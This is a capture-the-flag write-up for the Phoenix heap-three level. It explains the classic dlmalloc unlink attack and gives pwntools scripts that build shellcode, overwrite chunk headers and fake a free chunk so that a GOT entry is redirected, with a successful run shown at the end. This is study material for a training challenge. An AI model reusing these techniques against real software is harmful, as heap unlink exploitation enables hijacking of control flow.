@@ -1,0 +1,244 @@
+---
+title: phoenix heap 3 - classic heap unlink attack
+description: exploiting the infamous doug lea heap implementation, classic unlink!
+image: rsc/imgs/skull_pixel.png
+author: execius
+date: 2025-08-01
+tags: [binary exploitation]
+---
+
+## intruduction and context 
+- this level is interesting because unlike the previous level it doesn't depend on the programmer of the binary being stupid beyond saving , this time we're abusing the heap algorithm itself , in what is known as an `unlink()` attack.
+- before doing this challenge i had no idea how the heap works so i had to understand the heap first ,i read the glibc implementation of malloc , the analysis is in the article [[THE HEAP]], i did that because in am dumb more than a programmer who calls a variable  that the user can modify  ,instead of reading the implementation of doug lea that is used in the challenge and is fairly simple ,i read the latest glibc wich is more complex and ended up not contributing anything to my progress .
+- anyway ,  i went and did a bit of analysis of dlmalloc , it's on [[malloc source code analysis]] article  , and finally i had a bit of an idea on how to exploit that binary 
+- i will be working on the 32 bit version of the challenge , linux , little endian. 
+## Analysis of the binary 
+- running the binary alone produces a segfault , and after playing with it one could figure out that it takes three command line arguments , that is confirmed in the source code :
+	
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+
+void winner() {
+  printf("Level was successfully completed at @ %ld seconds past the Epoch\n",
+      time(NULL));
+}
+
+int main(int argc, char **argv) {
+  char *a, *b, *c;
+
+  a = malloc(32);
+  b = malloc(32);
+  c = malloc(32);
+
+  strcpy(a, argv[1]);
+  strcpy(b, argv[2]);
+  strcpy(c, argv[3]);
+
+  free(c);
+  free(b);
+  free(a);
+
+  printf("dynamite failed?\n");
+}
+``` 
+- as we see , the program mallocs three variables **consecutively** and this is the first allocation in the program (which means their blocks are probably contiguous ) 
+- second we have a strcpy from the first command line arguments to each of the variables , this is clearly a buffer overflow since we can write a string of any size , we can go beyond the bounds of the variables 
+- here is how heap chunks look in memory , along with some comments from doug lea himself:
+```C
+
+/*
+   malloc_chunk details:
+
+    (The following includes lightly edited explanations by Colin Plumb.)
+
+    Chunks of memory are maintained using a `boundary tag' method as
+    described in e.g., Knuth or Standish.  (See the paper by Paul
+    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a
+    survey of such techniques.)  Sizes of free chunks are stored both
+    in the front of each chunk and at the end.  This makes
+    consolidating fragmented chunks into bigger chunks very fast.  The
+    size fields also hold bits representing whether chunks are free or
+    in use.
+
+    An allocated chunk looks like this:
+
+
+    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of previous chunk, if allocated            | |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of chunk, in bytes                         |P|
+      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             User data starts here...                          .
+            .                                                               .
+            .             (malloc_usable_space() bytes)                     .
+            .                                                               |
+nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of chunk                                     |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+    Where "chunk" is the front of the chunk for the purpose of most of
+    the malloc code, but "mem" is the pointer that is returned to the
+    user.  "Nextchunk" is the beginning of the next contiguous chunk.
+
+    Chunks always begin on even word boundries, so the mem portion
+    (which is returned to the user) is also on an even word boundary, and
+    thus at least double-word aligned.
+
+    Free chunks are stored in circular doubly-linked lists, and look like this:
+
+    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Size of previous chunk                            |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    `head:' |             Size of chunk, in bytes                         |P|
+      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Forward pointer to next chunk in list             |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Back pointer to previous chunk in list            |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            |             Unused space (may be 0 bytes long)                .
+            .                                                               .
+            .                                                               |
+nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    `foot:' |             Size of chunk, in bytes                           |
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+    The P (PREV_INUSE) bit, stored in the unused low-order bit of the
+    chunk size (which is always a multiple of two words), is an in-use
+    bit for the *previous* chunk.  If that bit is *clear*, then the
+    word before the current chunk size contains the previous chunk
+    size, and can be used to find the front of the previous chunk.
+    The very first chunk allocated always has this bit set,
+    preventing access to non-existent (or non-owned) memory. If
+    prev_inuse is set for any given chunk, then you CANNOT determine
+    the size of the previous chunk, and might even get a memory
+    addressing fault when trying to do so.
+
+```
+- i am going to show you how that might look in memory :
+```text
++-------------------+-------------------+-------------------+
+|  Heap Bloc a      |  Heap Block b     |  Heap Block c     |
++---------+---------+---------+---------+---------+---------+
+| Header  |  Data   | Header  |  Data   | Header  |  Data   |
+| (size,  | (alloc  | (size,  | (alloc  | (size,  | (alloc  |
+| flags)  | space)  | flags)  | space)  | flags)  | space)  |
++---------+---------+---------+---------+---------+---------+
+```
+- the header of a heap chunks looks like this :
+```C
+struct malloc_chunk {
+
+  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
+
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+};
+```
+- the fd and bk are only used if the block is freed , when it is in use their memory is in user's  allocated space and is used to hold user data , and when the block is freed they are used as links in a doubly linked list of free blocks.
+## the exploit strategy
+## the core of the exploit 
+- i did a fairly detailed analysis in the above mentioned article about dlmalloc , here i am gonna show just some snippets , now when i was reading i knew i had to find something that did arbitrary writes to an address i can control and that was the `unlink` macro :
+```C
+	#define unlink(P, BK, FD) {
+		  FD = P->fd;                                                          \
+		  BK = P->bk;                                                          \
+		  FD->bk = BK;  /*dereference*/                                        \
+		  BK->fd = FD; 
+}
+```
+- if i can control the values FD and BK i can write to any address i want . keep this in mind as you read .
+- the portion of the free function we'll exploit is this :
+```c
+  nextchunk = chunk_at_offset(p, size);
+  nextsize = chunksize(nextchunk);
+
+  if (nextchunk != av->top) {
+	/* get and clear inuse bit */
+	nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+	set_head(nextchunk, nextsize);
+
+	/* consolidate forward */
+  if (!nextinuse) {
+	  unlink(nextchunk, bck, fwd);
+	  size += nextsize;
+	}
+```
+- so what we will do is that we'll make it seem that there is another block above `c` that is empty ,  so the free function would like to merge them and in the process it will call the ``unlink`` macro on the chunk we will create and which we will be able to control it's fd and bk pointer to make an arbitrary write 
+- and how can we do that , as you can see in `nextchunk = chunk_at_offset(p, size);` , the next chunk is retrieved using an offset that is the size of the current chunk , so if we make the size of c 100 for example , it will jump 100 bytes ahead think that there is a header there 
+- we can set c to any size we want because we can overwrite it's  header if we overflow `b` , and we can put fake meta data after the right offset (including our fake fd and bk) if we overflow `c` so when the free function jumps there it will think it is a valid chunk and call `unlink` on it.
+- after unlink is called , if fd is pointing to 12 bytes before a `got`  entry (puts@got -12) and bk to  a place that has out shellcode the line `FD->bk = BK;` will go to an offset of 12 of fd , because in the struct of chunks `bk` is after prevsize, size and fd , each of them 4 bytes and thus 12 (this is the way structs work in c everyting is an offset) , which will factor out the -12 from before and land us right on our got entry , and then it will write out bk into that entry , which will be our shellcode that calls the winner function .
+- you say why not write the winner function pointer directly , if you havent seen it already ,`unlink` also writes to BK->fd in the line `FD->bk = BK;` , if the bk is a direct pointer to winner , this line will try to write to a 8 offset of that address which is in  the code section which is non writable and it will crash the program , but if we put an address to a shellcode in the heap it will be fine as long as we keep out shellcode under 8 bytes which it already is , and if it was not we could simply use a `jmp` instruction at the location in bk and jump to our loong shellcode at a safe offset , but we don't need to do that now  since we just got two small instructions.
+- let's just go and make the exploit so we can dive into the technical stuff
+## making the exploit
+- first we'll make input for the first argument that's gonna go into `a` :
+```python
+from pwn import *
+shellcode = ''
+shellcode = pwnlib.shellcraft.amd64.push(WINNER_ADDR)
+shellcode += pwnlib.shellcraft.amd64.ret()
+shellcode = pwnlib.asm.asm(shellcode, arch='amd64')
+offset=32-len(shellcode)
+addressbin = p64(0x7ffff7ef6010)
+payload = 16*'a' + shellcode
+#+p32(0xfffffffc)+p32(0x108)
+print(payload)
+```
+- we basically make a shellcode using shellcraft utility from pwntools , the idea behind the shell code is to push the address of the function i wanna redirect the program to , which is called `winner` , i found the by simply disassembling it in gdb with `(gdb) disassemble winner` and after pushing its address we do a `ret` instruction to jump to it , simple if you know assembly .
+- we place the shellcode after an offset because when a is freed , the first 8 bytes are gonna be overwritten with arbitrary pointers that represent its `fd` and `bk` , so i just placed the shellcode after a 16 offset so it stays safe .
+
+- now we will make the argv[2] input which will be in b :
+```python
+from pwn import *
+offset = 36
+Payload =  offset*'a'+p32(0x65)
+print(Payload)
+```
+- the offset calculated in this manner : when we allocate a block in the heap malloc adds a 8 bytes for its header and adds some bytes to make the address a multiple of 8 , so when the code called malloc  with 32, it allocated 40 , 32+8 bytes summing up to 40 so no need to align anything . 8 of that 40 is before the address returned to us and is used as a header that holds `prevsize` and `size` from the structs earlier  , so we write 32 and then we reach the header of the `c` chunk , we write another 4 bytes to go after `prevsize` and at `size` , and that's how our offset lands us at the location of size so we can modify it and make a fake chunk after c.
+- we write the offset with giberish and then we make the size of c 0x64 , which is 100 not 101 in this case , since the last bit of the size is used to signal if the previous block is in use (since the size is always aligned to be a multiple of 8 , its lowest 3 bits are never used (try it , see the binary representation of multiples of 8) , so they are not considered when getting the size and are used as flags ), and this that 0x65 is considered a 100 , we set the used flag to 1 so the c chunk is not merged with b , we wanna merge it with the next fake chunk we'll make . 
+
+
+- now making the fake chunk :
+```python
+from pwn import *
+shellcode_addr =0xf7e69028
+got = 0x804c13c
+offset = 92
+header = 2*p32(0xfffffffc)+p32(got - 12) + p32(shellcode_addr)
+Payload = offset* 'a' + header
+print(Payload)
+```
+- so we got the address of the shellcode simply using the disassembly and gdb to locate `a` and then jumping a 16 offset 
+- then the address of the got entry of `puts` , which i also did found using the disassembly and gdb , beware that the address called in the disassembly is a plt not a got address and you must disassembly that plt address to find the got one that it jump to in the first instruction , a trampoline function .
+- remember that our next chunk's user data will start after an offset 100 , but the `size` and `prevsize` are behind that by 8 bytes , so if we wanna make the entire header of this fake chunk we'll have to start at an offset of 92 
+- we make our header , first we make `prevsize` and`size` to 0xfffffffc , and that choice i will explain after a bit , then we set fd 12 bytes before  the address of the got entry of `puts` , which i explained why in the [[heap buffer overflow#the exploit strategy| the exploit strategy section]] , and the we make our bk to be the address of our shellcode in the heap .
+- why 0xfffffffc ? to tell you the reason dear reader , i'm gonna have to admit that i lied to you , we are not setting one fake chunk , we'll be making two of them , now why is that you ask? , in the free function we have : 
+```C
+
+      if (nextchunk != av->top) {
+        /* get and clear inuse bit */
+        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+        set_head(nextchunk, nextsize);
+
+        /* consolidate forward */
+        if (!nextinuse) {
+          unlink(nextchunk, bck, fwd);
+          size += nextsize;
+        }
+```
+- the free function doesn't just fetch the next chunk after c but also checks if it is free by checking the header of the chunk after the once we make , in the line  `nextinuse =inuse_bit_at_offset(nextchunk, nextsize);`, next in use is fetched by adding the size of the fake chunk we created to it's position  and then fetching the flag bit to determine if our fake chunk is free , and we want it to seem so, so we will have to also fake that , here comes the magic of the number 0xfffffffc , to understand what it does , see how negative numbers in binary work , what i am gonna tell is that if adding it to an address is equivalent to substracting 4 from that address , so when the function adds to our fake chunk's address to get the next one , it ends up returning backwards 4 bytes which lands it on the`size` variable of our fake chunk , and thing that that is in fact the start of the user data of the next chunk , it checks backwards where it thinks would be the size , but there is just the `prevsize` of our fake chunk , which is also 0xffffffffc  , and since it is aligned by 8 , it interprets it like the PREV_INUSE of the next chunk is not set , so it thinks that our fake chunk is free and executes the unlink where the magic happens .
+# execution 
+``` bash
+user@phoenix-amd64:~$ /opt/phoenix/i486/heap-three $(python ~/heapthreea.py) $(python ~/heapthreeb.py)   $(python ~/heapthreec.py)
+
+
+Level was successfully completed at @ 1740109517 seconds past the Epoch
+
+```
+- and that is it friend , heap chunks spoofed , unlink abused , control flow hijacked .
